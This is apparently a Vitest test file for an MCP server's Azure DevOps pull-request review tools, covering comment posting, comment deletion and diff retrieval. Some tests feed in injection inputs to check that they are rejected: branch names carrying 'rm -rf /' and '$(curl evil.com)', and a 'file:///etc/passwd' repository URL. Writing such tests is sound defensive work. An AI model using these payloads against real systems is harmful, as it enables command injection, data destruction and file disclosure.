import { describe, it, expect, vi, beforeEach } from 'vitest';
import { configureReviewTool, getRefactorInstructions } from '../src/tools/review.js';
import { configureReviewTools } from '../src/tools.js';
import { configureReviewPrompts } from '../src/prompts.js';
import { createMockServer, isValidToolResponse, isValidErrorResponse } from '@sc-node-mcp/shared-tests/helpers/mockServer';
import { createMockConnection, createMockGitApi } from '@sc-node-mcp/shared-tests/helpers/mockConnection';

// Hoist execFile mocks so vi.mock factory can reference them
const { execMock, execAsyncMock } = vi.hoisted(() => {
  const execAsyncMock = vi.fn();
  const execMock = vi.fn();
  // util.promisify checks this symbol first; returning execAsyncMock bypasses callback wrapping
  execMock[Symbol.for('nodejs.util.promisify.custom')] = execAsyncMock;
  return { execMock, execAsyncMock };
});

vi.mock('node:child_process', () => ({
  execFile: execMock
}));

const fsMock = vi.hoisted(() => ({
  mkdir: vi.fn().mockResolvedValue(undefined),
  rm: vi.fn().mockResolvedValue(undefined),
  readFile: vi.fn().mockResolvedValue('Review guidelines content'),
  readdir: vi.fn().mockResolvedValue([])
}));

vi.mock('node:fs/promises', () => ({
  default: fsMock
}));

vi.mock('@sc-node-mcp/ado-core/connection', () => ({
  getADOConnection: vi.fn()
}));

const validPrUrl = 'https://dev.azure.com/sc-ado/TestProject/_git/TestRepo/pullrequest/123';

const mockPr = {
  id: 123,
  title: 'My Feature PR',
  status: 'active',
  sourceRefName: 'refs/heads/feature/my-feature',
  targetRefName: 'refs/heads/main',
  repository: { remoteUrl: 'https://dev.azure.com/sc-ado/TestProject/_git/TestRepo' }
};

describe('Review Tools', () => {
  let mockServer;
  let mockConnection;
  let mockGitApi;
  let getConnectionMock;

  beforeEach(() => {
    vi.clearAllMocks();
    fsMock.mkdir.mockResolvedValue(undefined);
    fsMock.rm.mockResolvedValue(undefined);
    fsMock.readFile.mockResolvedValue('Review guidelines content');
    fsMock.readdir.mockResolvedValue([]);

    mockServer = createMockServer();
    mockConnection = createMockConnection();
    mockGitApi = createMockGitApi();
    mockConnection.getGitApi.mockResolvedValue(mockGitApi);
    getConnectionMock = vi.fn().mockResolvedValue(mockConnection);
    configureReviewTool(mockServer, getConnectionMock, {});
  });

  describe('getRefactorInstructions', () => {
    it('should return notice when no file path is configured', async () => {
      const result = await getRefactorInstructions(undefined);
      expect(result).toContain('No review guidelines configured');
      expect(result).toContain('CODE_REVIEW_GUIDE_FILE');
    });

    it('should return file contents when file path is valid', async () => {
      fsMock.readFile.mockResolvedValue('My custom review guidelines');
      const result = await getRefactorInstructions('/path/to/guidelines.md');
      expect(result).toBe('My custom review guidelines');
    });

    it('should return error message when file cannot be read', async () => {
      fsMock.readFile.mockRejectedValue(new Error('ENOENT: no such file'));
      const result = await getRefactorInstructions('/nonexistent/file.md');
      expect(result).toContain('Could not load review guidelines');
      expect(result).toContain('/nonexistent/file.md');
    });
  });

  describe('post_pr_comment', () => {
    it('should create a new comment thread on a file', async () => {
      const response = await mockServer.invokeTool('post_pr_comment', {
        prUrl: validPrUrl,
        filePath: 'src/index.js',
        line: 10,
        commentText: 'Please refactor this'
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(mockGitApi.createThread).toHaveBeenCalledOnce();
      const [thread] = mockGitApi.createThread.mock.calls[0];
      expect(thread.comments[0].content).toContain('🤖 Co-pilot Assisted Review:');
      expect(thread.comments[0].content).toContain('Please refactor this');
    });

    it('should set filePath with leading slash on new thread', async () => {
      await mockServer.invokeTool('post_pr_comment', {
        prUrl: validPrUrl,
        filePath: 'src/index.js',
        line: 5,
        commentText: 'Test'
      });

      const [thread] = mockGitApi.createThread.mock.calls[0];
      expect(thread.threadContext.filePath).toBe('/src/index.js');
    });

    it('should not double-add leading slash if already present', async () => {
      await mockServer.invokeTool('post_pr_comment', {
        prUrl: validPrUrl,
        filePath: '/src/index.js',
        line: 5,
        commentText: 'Test'
      });

      const [thread] = mockGitApi.createThread.mock.calls[0];
      expect(thread.threadContext.filePath).toBe('/src/index.js');
    });

    it('should reply to an existing thread when threadId is provided', async () => {
      const response = await mockServer.invokeTool('post_pr_comment', {
        prUrl: validPrUrl,
        filePath: 'src/index.js',
        line: 10,
        commentText: 'Acknowledged',
        threadId: 42
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(mockGitApi.createComment).toHaveBeenCalledOnce();
      const [comment, , , threadId] = mockGitApi.createComment.mock.calls[0];
      expect(comment.content).toContain('🤖 Co-pilot Assisted Review:');
      expect(threadId).toBe(42);
    });

    it('should not double-prefix a comment that already has the prefix', async () => {
      const prefix = '🤖 Co-pilot Assisted Review: ';
      await mockServer.invokeTool('post_pr_comment', {
        prUrl: validPrUrl,
        filePath: 'src/index.js',
        line: 10,
        commentText: `${prefix}Already prefixed`
      });

      const [thread] = mockGitApi.createThread.mock.calls[0];
      const content = thread.comments[0].content;
      expect(content.split('🤖').length).toBe(2);
    });

    it('should return error for invalid PR URL format', async () => {
      const response = await mockServer.invokeTool('post_pr_comment', {
        prUrl: 'https://github.com/org/repo/pull/1',
        filePath: 'src/index.js',
        line: 10,
        commentText: 'Test'
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Invalid Azure DevOps PR URL format.');
    });

    it('should return error on API failure', async () => {
      mockGitApi.createThread.mockRejectedValue(new Error('Thread creation failed'));

      const response = await mockServer.invokeTool('post_pr_comment', {
        prUrl: validPrUrl,
        filePath: 'src/index.js',
        line: 10,
        commentText: 'Test'
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Thread creation failed');
    });

    it('should stringify a rejection value that has no .message property', async () => {
      mockGitApi.createThread.mockRejectedValue('a plain string rejection');

      const response = await mockServer.invokeTool('post_pr_comment', {
        prUrl: validPrUrl,
        filePath: 'src/index.js',
        line: 10,
        commentText: 'Test'
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('a plain string rejection');
    });
  });

  describe('delete_all_pr_review_comments', () => {
    it('should delete AI-generated comments and report count', async () => {
      const threads = [
        {
          id: 1,
          comments: [
            { id: 10, content: '🤖 Co-pilot Assisted Review: Fix this', isDeleted: false },
            { id: 11, content: 'Normal human comment', isDeleted: false }
          ]
        }
      ];
      mockGitApi.getThreads.mockResolvedValue(threads);

      const response = await mockServer.invokeTool('delete_all_pr_review_comments', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Deleted 1');
      expect(mockGitApi.deleteComment).toHaveBeenCalledOnce();
    });

    it('should skip already-deleted comments', async () => {
      const threads = [
        {
          id: 1,
          comments: [
            { id: 10, content: '🤖 Co-pilot Assisted Review: Fix this', isDeleted: true }
          ]
        }
      ];
      mockGitApi.getThreads.mockResolvedValue(threads);

      const response = await mockServer.invokeTool('delete_all_pr_review_comments', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Deleted 0');
      expect(mockGitApi.deleteComment).not.toHaveBeenCalled();
    });

    it('should skip a thread with no comments array', async () => {
      const threads = [{ id: 1, comments: [] }, { id: 2 }];
      mockGitApi.getThreads.mockResolvedValue(threads);

      const response = await mockServer.invokeTool('delete_all_pr_review_comments', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Deleted 0');
      expect(mockGitApi.deleteComment).not.toHaveBeenCalled();
    });

    it('should delete comments across multiple threads', async () => {
      const threads = [
        {
          id: 1,
          comments: [{ id: 10, content: '🤖 Co-pilot Assisted Review: Issue 1', isDeleted: false }]
        },
        {
          id: 2,
          comments: [{ id: 20, content: '🤖 Co-pilot Assisted Review: Issue 2', isDeleted: false }]
        }
      ];
      mockGitApi.getThreads.mockResolvedValue(threads);

      const response = await mockServer.invokeTool('delete_all_pr_review_comments', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Deleted 2');
      expect(mockGitApi.deleteComment).toHaveBeenCalledTimes(2);
    });

    it('should report errors for individual failed deletions but still succeed overall', async () => {
      const threads = [
        {
          id: 1,
          comments: [{ id: 10, content: '🤖 Co-pilot Assisted Review: Issue', isDeleted: false }]
        }
      ];
      mockGitApi.getThreads.mockResolvedValue(threads);
      mockGitApi.deleteComment.mockRejectedValue(new Error('Permission denied'));

      const response = await mockServer.invokeTool('delete_all_pr_review_comments', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Deleted 0');
      expect(response.content[0].text).toContain('Errors');
    });

    it('should return error for invalid PR URL format', async () => {
      const response = await mockServer.invokeTool('delete_all_pr_review_comments', {
        prUrl: 'https://not-ado.example.com/pr/123'
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Invalid Azure DevOps PR URL format.');
    });

    it('should return error when getThreads API fails', async () => {
      mockGitApi.getThreads.mockRejectedValue(new Error('Network error'));

      const response = await mockServer.invokeTool('delete_all_pr_review_comments', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Network error');
    });
  });

  describe('repo_review_pr', () => {
    beforeEach(() => {
      execAsyncMock.mockImplementation(async (file, args) => {
        if (args.includes('--name-status')) return { stdout: 'M\tsrc/index.js\n', stderr: '' };
        if (args[0] === 'merge-base') return { stdout: 'abc123def456\n', stderr: '' };
        if (args[0] === 'branch') return { stdout: '* main\n  origin/feature/my-feature\n', stderr: '' };
        if (args[0] === 'diff') return { stdout: '+added line\n-removed line\n', stderr: '' };
        return { stdout: '', stderr: '' };
      });
    });

    it('should return error for invalid PR URL format', async () => {
      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: 'https://dev.azure.com/invalid-path'
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Invalid Azure DevOps PR URL format.');
    });

    it('should return error when PR is not found', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(null);

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('not found');
    });

    it('should return error when getADOConnection fails', async () => {
      getConnectionMock.mockRejectedValue(new Error('Connection failed'));

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Connection failed');
    });

    it('should stringify a rejection value that has no .message property', async () => {
      getConnectionMock.mockRejectedValue('connection provider blew up');

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('connection provider blew up');
    });

    it('should prune stale leftover clone dirs but keep recent/unrecognized ones', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      const staleTs = Date.now() - 7 * 60 * 60 * 1000;
      fsMock.readdir.mockResolvedValue([
        `prreview-1-${staleTs}`,
        `prdiff-2-${Date.now()}`,
        'not-a-scratch-dir'
      ]);

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(fsMock.rm).toHaveBeenCalledWith(
        expect.stringContaining(`prreview-1-${staleTs}`),
        { recursive: true, force: true }
      );
      expect(fsMock.rm).not.toHaveBeenCalledWith(
        expect.stringContaining('prdiff-2-'),
        expect.anything()
      );
    });

    it('should tolerate a readdir failure when pruning stale clone dirs', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      fsMock.readdir.mockRejectedValue(new Error('ENOENT'));

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
    });

    it('should reject a PR with an unsafe branch name (defence against argument/shell injection)', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue({
        ...mockPr,
        sourceRefName: 'refs/heads/feature; rm -rf /'
      });

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('unsafe');
    });

    it('should reject a PR whose repository URL is not http(s)', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue({
        ...mockPr,
        repository: { remoteUrl: 'file:///etc/passwd' }
      });

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Unexpected repository URL');
    });

    it('should return diff and review guidelines when PR is found and git commands succeed', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      const text = response.content[0].text;
      expect(text).toContain('PR 123 Review:');
      expect(text).toContain('My Feature PR');
      expect(text).toContain('feature/my-feature');
      expect(text).toContain('main');
    });

    it('should include review guidelines from configured file', async () => {
      const serverWithConfig = createMockServer();
      configureReviewTool(serverWithConfig, getConnectionMock, { codeReviewGuideFile: '/path/to/guidelines.md' });
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      fsMock.readFile.mockResolvedValue('Custom guidelines here');

      const response = await serverWithConfig.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Custom guidelines here');
    });

    it('should return no-changes message when diff is empty', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      execAsyncMock.mockImplementation(async (file, args) => {
        if (args.includes('--name-status')) return { stdout: '', stderr: '' };
        if (args[0] === 'merge-base') return { stdout: 'abc123\n', stderr: '' };
        if (args[0] === 'branch') return { stdout: '* main\n', stderr: '' };
        return { stdout: '', stderr: '' };
      });

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('No changes found');
    });

    it('should fall back to direct diff when merge-base command fails', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      execAsyncMock.mockImplementation(async (file, args) => {
        if (args[0] === 'merge-base') throw new Error('no merge base');
        if (args.includes('--name-status')) return { stdout: 'M\tsrc/app.js\n', stderr: '' };
        if (args[0] === 'branch') return { stdout: '* main\n', stderr: '' };
        if (args[0] === 'diff') return { stdout: '+change\n', stderr: '' };
        return { stdout: '', stderr: '' };
      });

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
    });

    it('should clean up temp directory even when git commands fail after clone', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      let callCount = 0;
      execAsyncMock.mockImplementation(async () => {
        callCount++;
        if (callCount === 1) return { stdout: '', stderr: '' }; // git clone succeeds
        throw new Error('git fetch failed');
      });

      const response = await mockServer.invokeTool('repo_review_pr', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(fsMock.rm).toHaveBeenCalled();
    });
  });

  describe('repo_pr_diff', () => {
    beforeEach(() => {
      execAsyncMock.mockImplementation(async (file, args) => {
        if (args.includes('--name-status')) return { stdout: 'M\tsrc/index.js\nA\tsrc/new.js\n', stderr: '' };
        if (args[0] === 'merge-base') return { stdout: 'abc123def456\n', stderr: '' };
        if (args[0] === 'branch') return { stdout: '* main\n  origin/feature/my-feature\n', stderr: '' };
        if (args[0] === 'diff') return { stdout: '+added line\n-removed line\n', stderr: '' };
        return { stdout: '', stderr: '' };
      });
    });

    it('should return error for invalid PR URL format', async () => {
      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: 'https://dev.azure.com/invalid-path'
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Invalid Azure DevOps PR URL format.');
    });

    it('should return error when PR is not found', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(null);

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('not found');
    });

    it('should return error when getADOConnection fails', async () => {
      getConnectionMock.mockRejectedValue(new Error('Connection refused'));

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Connection refused');
    });

    it('should stringify a rejection value that has no .message property', async () => {
      getConnectionMock.mockRejectedValue('connection provider blew up');

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('connection provider blew up');
    });

    it('should reject a PR with an unsafe branch name (defence against argument/shell injection)', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue({
        ...mockPr,
        targetRefName: 'refs/heads/$(curl evil.com)'
      });

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('unsafe');
    });

    it('should reject a PR whose repository URL is not http(s)', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue({
        ...mockPr,
        repository: { remoteUrl: 'file:///etc/passwd' }
      });

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('Unexpected repository URL');
    });

    it('should return full diff when PR is found and git commands succeed', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      const text = response.content[0].text;
      expect(text).toContain('PR 123 Diff:');
      expect(text).toContain('feature/my-feature');
      expect(text).toContain('main');
      expect(text).toContain('Full Diffs:');
    });

    it('should return no-changes message when diff is empty', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      execAsyncMock.mockImplementation(async (file, args) => {
        if (args.includes('--name-status')) return { stdout: '', stderr: '' };
        if (args[0] === 'merge-base') return { stdout: 'abc123\n', stderr: '' };
        if (args[0] === 'branch') return { stdout: '* main\n', stderr: '' };
        return { stdout: '', stderr: '' };
      });

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
      expect(response.content[0].text).toContain('No changes found');
    });

    it('should fall back to direct diff when merge-base command fails', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      execAsyncMock.mockImplementation(async (file, args) => {
        if (args[0] === 'merge-base') throw new Error('no merge base');
        if (args.includes('--name-status')) return { stdout: 'M\tsrc/app.js\n', stderr: '' };
        if (args[0] === 'branch') return { stdout: '* main\n', stderr: '' };
        if (args[0] === 'diff') return { stdout: '+change\n', stderr: '' };
        return { stdout: '', stderr: '' };
      });

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidToolResponse(response)).toBe(true);
    });

    it('should clean up temp directory even when git commands fail after clone', async () => {
      mockGitApi.getPullRequestById.mockResolvedValue(mockPr);
      let callCount = 0;
      execAsyncMock.mockImplementation(async () => {
        callCount++;
        if (callCount === 1) return { stdout: '', stderr: '' }; // git clone succeeds
        throw new Error('git fetch failed');
      });

      const response = await mockServer.invokeTool('repo_pr_diff', {
        prUrl: validPrUrl
      });

      expect(isValidErrorResponse(response)).toBe(true);
      expect(fsMock.rm).toHaveBeenCalled();
    });
  });

  describe('configureReviewTools orchestrator', () => {
    it('should register all review tools via tools.js', () => {
      const server = createMockServer();
      configureReviewTools(server, getConnectionMock, {});
      expect(server.getRegisteredTools().length).toBeGreaterThan(0);
    });
  });

  describe('configureReviewPrompts', () => {
    it('should register review prompts on the server', () => {
      const server = createMockServer();
      server.prompt = vi.fn();
      configureReviewPrompts(server);
      expect(server.prompt).toHaveBeenCalled();
    });

    it('should invoke prompt callbacks and cover message generators', async () => {
      const storedCallbacks = new Map();
      const server = createMockServer();
      server.prompt = vi.fn((name, _desc, _args, callback) => {
        storedCallbacks.set(name, callback);
      });
      // Call without getContext so the default () => null is used and called inside callbacks
      configureReviewPrompts(server);
      expect(storedCallbacks.size).toBe(3);

      const reviewResult = await storedCallbacks.get('review-pr')({ prUrl: 'https://dev.azure.com/sc-ado/Proj/_git/Repo/pullrequest/1' });
      expect(reviewResult.messages[0].content.text).toContain('Review pull request:');

      const diffResult = await storedCallbacks.get('analyze-pr-diff')({ prUrl: 'https://dev.azure.com/sc-ado/Proj/_git/Repo/pullrequest/2' });
      expect(diffResult.messages[0].content.text).toContain('repo_pr_diff');

      const deleteResult = await storedCallbacks.get('delete-pr-review-comments')({ prUrl: 'https://dev.azure.com/sc-ado/Proj/_git/Repo/pullrequest/3' });
      expect(deleteResult.messages[0].content.text).toContain('delete_all_pr_review_comments');
    });

    it('should default to an empty args object when a callback is invoked with no arguments', async () => {
      const storedCallbacks = new Map();
      const server = createMockServer();
      server.prompt = vi.fn((name, _desc, _args, callback) => {
        storedCallbacks.set(name, callback);
      });
      configureReviewPrompts(server);

      const result = await storedCallbacks.get('review-pr')();
      expect(result.messages[0].content.text).toContain('Review pull request:');
    });
  });
});
